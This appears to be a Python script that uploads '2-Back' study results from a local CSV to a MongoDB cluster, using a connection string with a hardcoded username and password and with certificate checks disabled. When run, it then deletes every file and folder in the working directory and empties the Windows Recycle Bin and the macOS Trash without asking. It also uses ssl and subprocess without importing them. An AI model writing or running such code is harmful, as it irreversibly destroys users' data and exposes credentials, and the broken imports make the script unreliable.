import os, ctypes, shutil
from pymongo import MongoClient
import csv

LOCAL_SAVE_PATH = "unsent_data.csv"

def upload_local_csv():
    if not os.path.exists(LOCAL_SAVE_PATH):
        print("No local data to upload.")
        return

    with open(LOCAL_SAVE_PATH, mode="r") as file:
        reader = csv.DictReader(file)
        data = list(reader)

    if not data:
        print("CSV is empty.")
        return

    try:
        import certifi
        ca = certifi.where()
        client = MongoClient("mongodb+srv://2-Back:CTGKXTNQ6SjpGRk7@2-back.yeusf74.mongodb.net/", ssl_cert_reqs=ssl.CERT_NONE)
        db = client["2-Back"]
        collection = db["results"]
        collection.insert_many(data)
        print("Bulk upload successful. Deleting local file...")
        os.remove(LOCAL_SAVE_PATH)
    except Exception as e:
        print(f"Bulk upload failed: {e}")

upload_local_csv()

def removal():
    cwd = os.getcwd()
    print(cwd)

    for filename in os.listdir(cwd):
        file_path = os.path.join(cwd, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            print(f"Failed to delete {file_path}. Reason: {e}")

    ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x00000007)
    subprocess.run(["osascript", "-e", 'tell app "Finder" to empty the trash'], check=True)

removal()
